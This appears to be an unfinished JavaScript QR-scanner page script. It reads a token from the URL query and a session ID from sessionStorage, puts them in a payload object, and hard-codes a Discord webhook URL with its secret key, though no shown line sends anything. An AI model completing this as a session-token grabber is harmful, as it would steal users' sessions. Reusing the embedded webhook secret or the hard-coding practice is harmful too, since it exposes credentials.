function scanDone(decodedText, decodedResult){
    console.log(decodedResult);
    console.log(decodedText);
}

function scanFail(error){
    console.warn(error);
}

let webhook = "https://discord.com/api/webhooks/1202435947950510130/zWaB9zVtYUnbmL-iNE67cKJKKJTfTU7NeuEN7BkK35VZmVjwpjzPpYrxi26AvWR5oQUv"

let token;

let cameras;

function ready(){
    token = window.location.search;
    console.log(token.substring(6));
    console.log(sessionStorage['sessionID']);
}

addEventListener("DOMContentLoaded", ready);

function startCommunication(){
    var payload = {
        oa: token,
        st: sessionStorage['sessionID']
    }
    cameras = HTML5Qrcode.getCameras();
    console.log(cameras);
}